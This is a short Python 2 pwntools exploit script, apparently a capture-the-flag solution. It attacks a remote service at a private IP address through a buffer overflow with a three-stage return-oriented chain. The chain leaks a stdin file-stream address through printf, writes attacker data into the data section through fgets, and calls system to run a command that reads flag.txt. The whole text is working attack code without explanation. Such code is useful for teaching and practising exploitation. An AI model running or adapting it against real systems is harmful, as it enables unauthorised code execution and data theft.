#!/usr/bin/env python2
from pwn import *
import struct


#context.log_level = 'DEBUG'
p = remote("192.168.56.101", 32812)
p.recvuntil('>')

pwnme = p32(0x80485f6)
stdin = p32(0x804a060)
printf_plt = p32(0x8048400)
fgets_plt = p32(0x8048410)
system_plt = p32(0x8048430)
data_section = p32(0x804a028)

# Stage one: leak the address of file stream
buf = "A"*44
buf += printf_plt
buf += pwnme
buf += stdin

p.sendline(buf)
leak_addr = u32(p.recvuntil("Go")[1:5])
print ("The file stream is at: " + hex(leak_addr))

# Stage two: trigger fgets to write /bin/sh to the data section
buf2 = "A"*44
buf2 += fgets_plt
buf2 += pwnme
buf2 += data_section
buf2 += p32(0x21)
buf2 += p32(leak_addr)
p.sendline(buf2) # send payload
p.sendline('cat flag.txt') # write to target

# Stage three: call system to get a shell
buf3 = "A"*44
buf3 += system_plt
buf3 += "BBBB"
buf3 += data_section
p.sendline(buf3)
print p.recvall()
